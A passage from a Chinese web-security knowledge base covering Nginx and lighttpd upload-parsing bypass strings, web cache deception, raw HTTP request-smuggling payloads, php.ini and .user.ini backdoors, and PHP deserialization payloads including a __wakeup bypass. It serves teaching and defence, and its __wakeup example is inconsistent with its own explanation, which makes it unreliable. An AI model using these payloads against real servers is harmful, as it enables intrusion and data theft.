</div>
<div class="section" id="lighttpd">
<h5>lighttpd<a class="headerlink" href="#lighttpd" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">xx.jpg/xx.php</span></code></p>
</div>
<div class="section" id="id3">
<h5>参考链接<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">Apache 上传绕过</a></li>
</ul>
</div>
</div>
<span id="document-vuln/middleware/nginx"></span><div class="section" id="nginx">
<h4>Nginx<a class="headerlink" href="#nginx" title="永久链接至标题">¶</a></h4>
<div class="section" id="fast-cgi">
<h5>Fast-CGI关闭<a class="headerlink" href="#fast-cgi" title="永久链接至标题">¶</a></h5>
<p>在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞：
在文件路径(xx.jpg)后面加上 <code class="docutils literal notranslate"><span class="pre">%00.php</span></code> ， 即 <code class="docutils literal notranslate"><span class="pre">xx.jpg%00.php</span></code> 会被当做 php 文件来解析</p>
</div>
<div class="section" id="id1">
<h5>Fast-CGI开启<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>在Fast-CGI开启状态下，在文件路径后加上 <code class="docutils literal notranslate"><span class="pre">/xx.php</span></code> ，则 <code class="docutils literal notranslate"><span class="pre">xx.jpg/xx.php</span></code> 会被解析为php文件</p>
</div>
<div class="section" id="cve-2013-4547">
<h5>CVE-2013-4547<a class="headerlink" href="#cve-2013-4547" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">a.jpg\x20\x00.php</span></code></p>
</div>
<div class="section" id="id2">
<h5>配置错误<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<div class="section" id="id3">
<h6>目录穿越<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<p>如果配置中存在类似 <code class="docutils literal notranslate"><span class="pre">location</span> <span class="pre">/foo</span> <span class="pre">{</span> <span class="pre">alias</span> <span class="pre">/bar/;</span> <span class="pre">}</span></code> 的配置时，<code class="docutils literal notranslate"><span class="pre">/foo../</span></code> 会被解析为 <code class="docutils literal notranslate"><span class="pre">/bar/../</span></code> 从而导致目录穿越的发生。</p>
</div>
<div class="section" id="id4">
<h6>目录遍历<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<p>配置中 <code class="docutils literal notranslate"><span class="pre">autoindex</span> <span class="pre">on</span></code> 开启时，Nginx中存在目录遍历漏洞。</p>
</div>
</div>
<div class="section" id="id5">
<h5>参考链接<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://www.91ri.org/9064.html">CVE-2013-4547 Nginx解析漏洞深入利用及分析</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-vuln/webcache"></span><div class="section" id="web-cache">
<h3>Web Cache欺骗攻击<a class="headerlink" href="#web-cache" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>网站通常都会通过如CDN、负载均衡器、或者反向代理来实现Web缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。</p>
<p>例如，网站 <code class="docutils literal notranslate"><span class="pre">htttp://www.example.com</span></code> 配置了反向代理。对于那些包含用户个人信息的页面，如 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php</span></code> ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如css文件、js文件、txt文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略HTTP缓存头。</p>
<p>Web cache攻击类似于RPO相对路径重写攻击，都依赖于浏览器与服务器对URL的解析方式。当访问不存在的URL时，如 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php/non-existent.css</span></code> ，浏览器发送get请求，依赖于使用的技术与配置，服务器返回了页面 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php</span></code> 的内容，同时URL地址仍然是 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php/non-existent.css</span></code>，http头的内容也与直接访问 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php</span></code> 相同，cacheing header、content-type（此处为text/html）也相同。</p>
</div>
<div class="section" id="id2">
<h4>漏洞成因<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>当代理服务器设置为缓存静态文件并忽略这类文件的caching header时，访问 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php/no-existent.css</span></code> 时，会发生什么呢？整个响应流程如下：</p>
<ol class="arabic simple">
<li>浏览器请求 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php/no-existent.css</span></code> ;</li>
<li>服务器返回 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php</span></code> 的内容(通常来说不会缓存该页面);</li>
<li>响应经过代理服务器;</li>
<li>代理识别该文件有css后缀;</li>
<li>在缓存目录下，代理服务器创建目录 <code class="docutils literal notranslate"><span class="pre">home.php</span></code> ，将返回的内容作为 <code class="docutils literal notranslate"><span class="pre">non-existent.css</span></code> 保存。</li>
</ol>
</div>
<div class="section" id="id3">
<h4>漏洞利用<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>攻击者欺骗用户访问 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php/logo.png?www.myhack58.com</span></code> ,导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含session标识、安全问题的答案，或者csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。</p>
</div>
<div class="section" id="id4">
<h4>漏洞存在的条件<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>漏洞要存在，至少需要满足下面两个条件：</p>
<ol class="arabic simple">
<li>web cache功能根据扩展进行保存，并忽略caching header;</li>
<li>当访问如 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php/non-existent.css</span></code> 不存在的页面，会返回 <code class="docutils literal notranslate"><span class="pre">home.php</span></code> 的内容。</li>
</ol>
</div>
<div class="section" id="id5">
<h4>漏洞防御<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>防御措施主要包括3点：</p>
<ol class="arabic simple">
<li>设置缓存机制，仅仅缓存http caching header允许的文件，这能从根本上杜绝该问题;</li>
<li>如果缓存组件提供选项，设置为根据content-type进行缓存;</li>
<li>访问 <code class="docutils literal notranslate"><span class="pre">http://www.example.com/home.php/non-existent.css</span></code> 这类不存在页面，不返回 <code class="docutils literal notranslate"><span class="pre">home.php</span></code> 的内容，而返回404或者302。</li>
</ol>
</div>
<div class="section" id="id6">
<h4>Web Cache欺骗攻击实例<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<div class="section" id="paypal">
<h5>Paypal<a class="headerlink" href="#paypal" title="永久链接至标题">¶</a></h5>
<p>Paypal在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后4位数、交易数据、emaill地址等信息。
受该攻击的部分页面包括：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">https://www.paypal.com/myaccount/home/attack.css</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">https://www.paypal.com/myaccount/settings/notifications/attack.css</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details</span></code> 。</li>
</ul>
</div>
</div>
<div class="section" id="id7">
<h4>参考链接<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://portswigger.net/blog/practical-web-cache-poisoning">practical web cache poisoning</a></li>
<li><a class="reference external" href="https://www.usenix.org/conference/usenixsecurity18/presentation/hao">End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks</a></li>
</ul>
</div>
</div>
<span id="document-vuln/httpSmuggling"></span><div class="section" id="http">
<h3>HTTP 请求走私<a class="headerlink" href="#http" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术，最早在 2005 年的一篇 <a class="reference external" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">文章</a> 中被提出。</p>
</div>
<div class="section" id="id3">
<h4>成因<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> 和 <code class="docutils literal notranslate"><span class="pre">Transfer-Encoding</span></code> 标头。</p>
</div>
<div class="section" id="id4">
<h4>分类<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>CLTE：前端服务器使用 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> 头，后端服务器使用 <code class="docutils literal notranslate"><span class="pre">Transfer-Encoding</span></code> 头</li>
<li>TECL：前端服务器使用 <code class="docutils literal notranslate"><span class="pre">Transfer-Encoding</span></code> 标头，后端服务器使用 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> 标头。</li>
<li>TETE：前端和后端服务器都支持 <code class="docutils literal notranslate"><span class="pre">Transfer-Encoding</span></code> 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</li>
</ul>
</div>
<div class="section" id="id5">
<h4>攻击<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<div class="section" id="cl0get">
<h5>CL不为0的GET请求<a class="headerlink" href="#cl0get" title="永久链接至标题">¶</a></h5>
<p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> 头，不进行处理。例如下面这个例子：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">44</span>\<span class="n">r</span>\<span class="n">n</span>

<span class="n">GET</span> <span class="o">/</span><span class="n">secret</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
</pre></div>
</div>
<p>前端服务器处理了 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> ，而后端服务器没有处理 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> ，基于pipeline机制认为这是两个独立的请求，就造成了漏洞的发生。</p>
</div>
<div class="section" id="cl-cl">
<h5>CL-CL<a class="headerlink" href="#cl-cl" title="永久链接至标题">¶</a></h5>
<p>根据RFC 7230，当服务器收到的请求中包含两个 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> 值时，就会出现漏洞。例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">8</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">7</span>\<span class="n">r</span>\<span class="n">n</span>

<span class="mi">12345</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">a</span>
</pre></div>
</div>
<p>这个例子中a就会被带入下一个请求，变为 <code class="docutils literal notranslate"><span class="pre">aGET</span> <span class="pre">/</span> <span class="pre">HTTP/1.1\r\n</span></code> 。</p>
</div>
<div class="section" id="cl-te">
<h5>CL-TE<a class="headerlink" href="#cl-te" title="永久链接至标题">¶</a></h5>
<p>CL-TE指前端服务器处理 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> ，处理 <code class="docutils literal notranslate"><span class="pre">Transfer-Encoding</span></code> 。例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="o">...</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">6</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">chunked</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
<span class="mi">0</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
<span class="n">a</span>
</pre></div>
</div>
<p>这个例子中a同样会被带入下一个请求，变为 <code class="docutils literal notranslate"><span class="pre">aGET</span> <span class="pre">/</span> <span class="pre">HTTP/1.1\r\n</span></code> 。</p>
</div>
<div class="section" id="te-cl">
<h5>TE-CL<a class="headerlink" href="#te-cl" title="永久链接至标题">¶</a></h5>
<p>TE-CL指前端服务器处理 <code class="docutils literal notranslate"><span class="pre">Transfer-Encoding</span></code> 请求头，而后端服务器处理 <code class="docutils literal notranslate"><span class="pre">Content-Length</span></code> 请求头。例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="o">...</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">4</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">chunked</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
<span class="mi">12</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">aPOST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
<span class="mi">0</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
</pre></div>
</div>
</div>
<div class="section" id="te-te">
<h5>TE-TE<a class="headerlink" href="#te-te" title="永久链接至标题">¶</a></h5>
<p>TE-TE指前后端服务器都处理 <code class="docutils literal notranslate"><span class="pre">Transfer-Encoding</span></code> 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 <code class="docutils literal notranslate"><span class="pre">Transfer-encoding</span></code> ，测试例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="o">...</span>
<span class="n">Content</span><span class="o">-</span><span class="n">length</span><span class="p">:</span> <span class="mi">4</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">chunked</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">encoding</span><span class="p">:</span> <span class="n">cow</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
<span class="mi">5</span><span class="n">c</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">aPOST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">15</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
<span class="n">x</span><span class="o">=</span><span class="mi">1</span>\<span class="n">r</span>\<span class="n">n</span>
<span class="mi">0</span>\<span class="n">r</span>\<span class="n">n</span>
\<span class="n">r</span>\<span class="n">n</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id6">
<h4>防御<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>禁用后端连接重用</li>
<li>确保连接中的所有服务器具有相同的配置</li>
<li>拒绝有二义性的请求</li>
</ul>
</div>
<div class="section" id="id7">
<h4>参考链接<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<div class="section" id="rfc">
<h5>RFC<a class="headerlink" href="#rfc" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2616">RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7230">RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1</a></li>
</ul>
</div>
<div class="section" id="blog-whitepaper">
<h5>Blog / Whitepaper<a class="headerlink" href="#blog-whitepaper" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">HTTP Request Smuggling by chaiml</a></li>
<li><a class="reference external" href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling by portswigger</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/6654">从一道题到协议层攻击之HTTP请求走私</a></li>
<li><a class="reference external" href="http://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf">HTTP Request Smuggling in 2020</a></li>
<li><a class="reference external" href="https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>
<span id="document-language/index"></span><div class="section" id="id1">
<h2>语言与框架<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-language/php/index"></span><div class="section" id="php">
<h3>PHP<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-language/php/backdoor"></span><div class="section" id="id1">
<h4>后门<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="php-ini">
<h5>php.ini构成的后门<a class="headerlink" href="#php-ini" title="永久链接至标题">¶</a></h5>
<p>利用 auto_prepend_file 和 include_path</p>
</div>
<div class="section" id="user-iniphp">
<h5>.user.ini文件构成的PHP后门<a class="headerlink" href="#user-iniphp" title="永久链接至标题">¶</a></h5>
<p>.user.ini可运行于所有以fastcgi运行的server。
利用方式同php.ini</p>
</div>
</div>
<span id="document-language/php/unserialize"></span><div class="section" id="id1">
<h4>反序列化<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="php">
<h5>PHP序列化实现<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h5>
<div class="section" id="id2">
<h6>常见处理器<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
<p>PHP序列化处理共有几种，分别为php、php_serialize、php_binary和WDDX(需要编译时开启支持)，默认为php，可通过配置中的 <code class="docutils literal notranslate"><span class="pre">session.serialize_handler</span></code> 修改。</p>
<p>如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX从PHP 7.4版本后开始弃用。从 PHP 5.5.4 起可以使用 php_serialize。 php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并且不会有 php 和 php_binary 所具有的限制。</p>
<p>其中PHP处理器的格式为：键名 + 竖线 + 经过serialize()函数序列化处理的值。</p>
<p>其中php_binary处理器的格式为：键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值。</p>
<p>其中php_serialize处理器的格式为：经过serialize()函数序列化处理的数组。</p>
</div>
<div class="section" id="id3">
<h6>序列化格式<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<p>其中php_serialize的实现在 <code class="docutils literal notranslate"><span class="pre">php-src/ext/standard/var.c</span></code> 中，主要函数为 <code class="docutils literal notranslate"><span class="pre">php_var_serialize_intern</span></code> ，序列化后的格式如下：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>boolean</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">b:&lt;value&gt;;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">b:1;</span></code> // true</li>
<li><code class="docutils literal notranslate"><span class="pre">b:0;</span></code> // false</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>integer</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">i:&lt;value&gt;;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>double</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">d:&lt;value&gt;;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>NULL</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">N;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>string</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">s:&lt;length&gt;:&quot;&lt;value&gt;&quot;;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">s:1:&quot;s&quot;;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>array</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">a:&lt;length&gt;:{key,</span> <span class="pre">value};</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">a:1:{s:4:&quot;key1&quot;;s:6:&quot;value1&quot;;}</span></code> // <code class="docutils literal notranslate"><span class="pre">array(&quot;key1&quot;</span> <span class="pre">=&gt;</span> <span class="pre">&quot;value1&quot;);</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>object</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:{&lt;properties&gt;};</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>reference</dt>
<dd><ul class="first last">
<li>指针类型</li>
<li><code class="docutils literal notranslate"><span class="pre">R:reference;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">$a</span> <span class="pre">=</span> <span class="pre">new</span> <span class="pre">A();$a-&gt;a=1;$a-&gt;b=&amp;$a-&gt;a;</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="privateprotect">
<h6>private与protect<a class="headerlink" href="#privateprotect" title="永久链接至标题">¶</a></h6>
<p>private与protect变量和public变量不同，不能直接设置。</p>
<p>private属性只能在其被定义的类内部访问，且不会被继承，在属性前加上类名，即 <code class="docutils literal notranslate"><span class="pre">%00className%00</span></code> 用于标定其是私有的。</p>
<p>protected属性可以在父类和子类中访问，变量前添加 <code class="docutils literal notranslate"><span class="pre">%00*%00</span></code> 用于标定其是受保护的。</p>
</div>
</div>
<div class="section" id="id4">
<h5>PHP反序列化漏洞<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>php在反序列化的时候会调用 <code class="docutils literal notranslate"><span class="pre">__wakeup</span></code> / <code class="docutils literal notranslate"><span class="pre">__sleep</span></code> 等函数，可能会造成代码执行等问题。若没有相关函数，在析构时也会调用相关的析构函数，同样会造成代码执行。</p>
<p>另外 <code class="docutils literal notranslate"><span class="pre">__toString</span></code> / <code class="docutils literal notranslate"><span class="pre">__call</span></code> 两个函数也有利用的可能。</p>
<p>其中 <code class="docutils literal notranslate"><span class="pre">__wakeup</span></code> 在反序列化时被触发，<code class="docutils literal notranslate"><span class="pre">__destruct</span></code> 在GC时被触发， <code class="docutils literal notranslate"><span class="pre">__toString</span></code> 在echo时被触发, <code class="docutils literal notranslate"><span class="pre">__call</span></code> 在一个未被定义的函数调用时被触发。</p>
<p>下面提供一个简单的demo.</p>
<div class="code php highlight-default notranslate"><div class="highlight"><pre><span></span>class Demo
{

    public $data;

    public function __construct($data)
    {
        $this-&gt;data = $data;
        echo &quot;construct&lt;br /&gt;&quot;;
    }

    public function __wakeup()
    {
        echo &quot;wake up&lt;br /&gt;&quot;;
    }

    public function __destruct()
    {
        echo &quot;Data&#39;s value is $this-&gt;data. &lt;br /&gt;&quot;;
        echo &quot;destruct&lt;br /&gt;&quot;;
    }
}

var_dump(serialize(new Demo(&quot;raw value&quot;)));
</pre></div>
</div>
<p>输出</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">construct</span>
<span class="n">Data</span><span class="s1">&#39;s value is raw value.</span>
<span class="n">destruct</span>
<span class="n">string</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span> <span class="s2">&quot;O:4:&quot;</span><span class="n">Demo</span><span class="s2">&quot;:1:{s:4:&quot;</span><span class="n">data</span><span class="s2">&quot;;s:9:&quot;</span><span class="n">raw</span> <span class="n">value</span><span class="s2">&quot;;}&quot;</span>
</pre></div>
</div>
<p>把序列化的字符串修改一下后，执行</p>
<p><code class="docutils literal notranslate"><span class="pre">unserialize('O:4:&quot;Demo&quot;:1:{s:4:&quot;data&quot;;s:15:&quot;malicious</span> <span class="pre">value&quot;;}');</span></code></p>
<p>输出</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wake</span> <span class="n">up</span>
<span class="n">Data</span><span class="s1">&#39;s value is malicious value.</span>
<span class="n">destruct</span>
</pre></div>
</div>
<p>这里看到，值被修改了.</p>
<p>上面是一个 <code class="docutils literal notranslate"><span class="pre">unserialize()</span></code> 的简单应用，不难看出，如果 <code class="docutils literal notranslate"><span class="pre">__wakeup()</span></code> 或者  <code class="docutils literal notranslate"><span class="pre">__desturct()</span></code> 有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。</p>
<p>那么，在 <code class="docutils literal notranslate"><span class="pre">__wakeup()</span></code> 中加入判断是否可以阻止这个漏洞呢？
在 <code class="docutils literal notranslate"><span class="pre">__wakeup()</span></code> 中我们加入一行代码</p>
<div class="code php highlight-default notranslate"><div class="highlight"><pre><span></span>public function __wakeup()
{
    if($this-&gt;data != &#39;raw value&#39;) $this-&gt;data = &#39;raw value&#39;;
    echo &quot;wake up&lt;br /&gt;&quot;;
}
</pre></div>
</div>
<p>但其实还是可以绕过的，在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本都存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过，于是使用下面的payload</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">unserialize</span><span class="p">(</span><span class="s1">&#39;O:7:&quot;HITCON&quot;:1:{s:4:&quot;data&quot;;s:15:&quot;malicious value&quot;;}&#39;</span><span class="p">);</span>
</pre></div>
</div>
<p>输出</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Data</span><span class="s1">&#39;s value is malicious value.</span>
<span class="n">destruct</span>
</pre></div>
</div>
<p>这里wakeup被绕过，值依旧被修改了。</p>
</div>
<div class="section" id="id5">
<h5>利用点<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<div class="section" id="soapclient">
<h6>SoapClient 原生利用<a class="headerlink" href="#soapclient" title="永久链接至标题">¶</a></h6>
<p>php中的SoapClient类可以创建soap数据报文，在非wsdl模式下，SoapClient的实例反序列化的时候会对第二个参数指明的url进行soap请求，该特性可用于SSRF。</p>
</div>
<div class="section" id="ziparchive">
